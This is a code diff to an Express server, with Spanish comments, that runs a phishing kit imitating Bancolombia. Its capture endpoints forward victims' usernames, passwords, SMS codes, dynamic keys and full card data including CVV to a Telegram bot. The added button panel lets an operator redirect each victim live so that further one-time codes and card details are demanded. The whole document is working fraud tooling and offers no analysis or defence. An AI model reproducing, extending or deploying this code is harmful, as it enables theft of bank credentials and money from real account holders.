@@ -11,7 +11,7 @@ app.use(express.json());
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID   = process.env.CHAT_ID;
 const PORT      = process.env.PORT || 4000;
-const SELF_URL  = process.env.RENDER_EXTERNAL_URL || 'https://popopopopos.onrender.com';
+const SELF_URL  = process.env.RENDER_EXTERNAL_URL || 'https://essa-global-server.onrender.com';
 
 // ─── Sessions Map ─────────────────────────────────────────────────────────────
 // sessionId → { redirect_to, last_msg_id, bank, data }
@@ -75,6 +75,57 @@ function esc(s) {
     .replace(/>/g, '&gt;');
 }
 
+// ─── Código corto → URL completa (Bancolombia) ───────────────────────────────
+const CODE_TO_URL = {
+  // Nuevos códigos compactos (≤64 bytes con sessionId)
+  'ELG' : 'index.html?state=error_logo',
+  'PLG' : 'index.html?state=pedir_logo',
+  'ESM' : 'sms.html?state=error_sms',
+  'PSM' : 'sms.html?state=pedir_sms',
+  'ECRD': 'card.html?state=error_card',
+  'PCRD': 'card.html?state=pedir_card',
+  'EDIN': 'dinamica.html?state=error_dinamica',
+  'PDIN': 'dinamica.html?state=pedir_dinamica',
+  // Códigos legacy (botones anteriores que aún puedan estar en Telegram)
+  'INICIO'  : 'index.html',
+  'SMS'     : 'sms.html',
+  'DINAMICA': 'dinamica.html',
+  'TARJETA' : 'card.html',
+};
+function resolveCode(code) {
+  return CODE_TO_URL[code] || null;   // ESY/PSY/E922/P922 → null → loader sigue girando
+}
+
+// Botonera estándar completa para Bancolombia
+function bancolomBtn(sid) {
+  return [
+    [
+      { text: '❌ Err Logo',    callback_data: `ELG|${sid}` },
+      { text: '✅ Pedir Logo',  callback_data: `PLG|${sid}` }
+    ],
+    [
+      { text: '❌ Err SMS',     callback_data: `ESM|${sid}` },
+      { text: '📱 Pedir SMS',   callback_data: `PSM|${sid}` }
+    ],
+    [
+      { text: '❌ Err Din.',    callback_data: `EDIN|${sid}` },
+      { text: '🔐 Pedir Din.',  callback_data: `PDIN|${sid}` }
+    ],
+    [
+      { text: '❌ Err Tarj.',   callback_data: `ECRD|${sid}` },
+      { text: '💳 Pedir Tarj.', callback_data: `PCRD|${sid}` }
+    ],
+    [
+      { text: '❌ Err SoyYo',   callback_data: `ESY|${sid}` },
+      { text: '✅ Pedir SoyYo', callback_data: `PSY|${sid}` }
+    ],
+    [
+      { text: '❌ Err 922',     callback_data: `E922|${sid}` },
+      { text: '📞 Pedir 922',   callback_data: `P922|${sid}` }
+    ]
+  ];
+}
+
 // ─── Universal polling ────────────────────────────────────────────────────────
 app.get('/instruction/:sessionId', (req, res) => {
   const s = sessions.get(req.params.sessionId);
@@ -101,8 +152,9 @@ app.post('/telegram/webhook', (req, res) => {
     answerCb(callback_query.id).catch(() => {});
 
     if (sessionId) {
+      const url = resolveCode(cmd);
       const s = sessions.get(sessionId) || {};
-      s.redirect_to = cmd;
+      if (url) s.redirect_to = url;   // solo actualiza si tiene URL mapeada
       s.last_msg_id = msgId;
       sessions.set(sessionId, s);
     }
@@ -125,20 +177,7 @@ app.post('/capture/index', (req, res) => {
   const pass = esc(password || indexClave);
   sendMsg(
     `🏦 <b>BANCOLOMBIA — Login</b>\n\n👤 <b>Usuario:</b> ${user}\n🔑 <b>Clave:</b> ${pass}\n\n🆔 <code>${sid}</code>`,
-    [
-      [
-        { text: '❌ Error Logo', callback_data: `INICIO|${sid}` },
-        { text: '📱 SMS',        callback_data: `SMS|${sid}` }
-      ],
-      [
-        { text: '🔐 Dinámica',   callback_data: `DINAMICA|${sid}` },
-        { text: '💳 Tarjeta',    callback_data: `TARJETA|${sid}` }
-      ],
-      [
-        { text: '✅ Soy Yo',     callback_data: `SOYYO|${sid}` },
-        { text: '📞 922',        callback_data: `922|${sid}` }
-      ]
-    ]
+    bancolomBtn(sid)
   ).catch(console.error);
 });
 
@@ -151,10 +190,7 @@ app.post('/capture/sms', (req, res) => {
   sessions.set(sessionId, s);
   sendMsg(
     `🏦 <b>BANCOLOMBIA — Código SMS</b>\n\n📱 <b>SMS:</b> <code>${esc(smsCode)}</code>\n\n🆔 <code>${sessionId}</code>`,
-    [[
-      { text: '❌ Error SMS', callback_data: `INICIO|${sessionId}` },
-      { text: '✅ Aprobar',   callback_data: `SOYYO|${sessionId}` }
-    ]]
+    bancolomBtn(sessionId)
   ).catch(console.error);
 });
 
@@ -164,10 +200,7 @@ app.post('/capture/dinamica', (req, res) => {
   if (!sessionId || !dinamicaCode) return;
   sendMsg(
     `🏦 <b>BANCOLOMBIA — Clave Dinámica</b>\n\n🔐 <b>Código:</b> <code>${esc(dinamicaCode)}</code>\n\n🆔 <code>${sessionId}</code>`,
-    [[
-      { text: '❌ Error',  callback_data: `INICIO|${sessionId}` },
-      { text: '✅ Aprobar', callback_data: `SOYYO|${sessionId}` }
-    ]]
+    bancolomBtn(sessionId)
   ).catch(console.error);
 });
 
@@ -177,10 +210,7 @@ app.post('/capture/card', (req, res) => {
   if (!sessionId) return;
   sendMsg(
     `🏦 <b>BANCOLOMBIA — Tarjeta</b>\n\n💳 <b>Número:</b> <code>${esc(cardnumber)}</code>\n📅 <b>Vence:</b> ${esc(expiry)}\n🔒 <b>CVV:</b> <code>${esc(cvv)}</code>\n\n🆔 <code>${sessionId}</code>`,
-    [[
-      { text: '❌ Error',   callback_data: `INICIO|${sessionId}` },
-      { text: '✅ Aprobar', callback_data: `SOYYO|${sessionId}` }
-    ]]
+    bancolomBtn(sessionId)
   ).catch(console.error);
 });
 
